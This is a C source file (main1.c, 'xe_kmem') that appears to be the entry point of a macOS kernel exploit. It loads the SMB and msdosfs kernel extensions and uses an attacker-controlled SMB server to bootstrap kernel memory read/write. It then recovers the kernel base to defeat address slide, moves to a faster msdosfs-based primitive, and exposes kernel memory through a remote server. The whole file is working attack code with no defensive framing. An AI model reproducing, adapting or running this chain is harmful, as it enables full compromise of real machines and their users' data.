//
//  main1.c
//  xe_kmem
//
//  Created by admin on 2/21/22.
//

#include <stdio.h>
#include <limits.h>

#include <dispatch/dispatch.h>

#include <sys/resource.h>
#include <arpa/inet.h>

#include <xe/util/binary.h>
#include <xe/util/assert.h>
#include <xe/util/msdosfs.h>
#include <xe/memory/kmem.h>
#include <xe/memory/kmem_msdosfs.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>

#include "public/xe_kmem/smbx_conf.h"
#include "smb/client.h"
#include "smb/params.h"

#include "kmem_bootstrap.h"


int main(int argc, const char* argv[]) {
    smb_client_load_kext();
    xe_util_msdosfs_loadkext();
    
    // Increase open file limit
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);

    // Base socket address of xe_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XE_SMBX_PORT);
    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
    
    xe_kmem_backend_t kmem_slow = kmem_boostrap_create(&smb_addr);
    xe_kmem_use_backend(kmem_slow);
    uintptr_t meh = kmem_boostrap_get_mach_execute_header(kmem_slow);
    xe_slider_kernel_init(meh);
    
    xe_kmem_backend_t kmem_fast = xe_kmem_msdosfs_create(KMEM_MSDOSFS_DEFAULT_BASE_IMAGE);
    xe_kmem_use_backend(kmem_fast);
    
    struct xe_kmem_remote_server_ctx ctx;
    ctx.mh_execute_header = meh;
    xe_kmem_remote_server_start(&ctx);
    
    return 0;
}

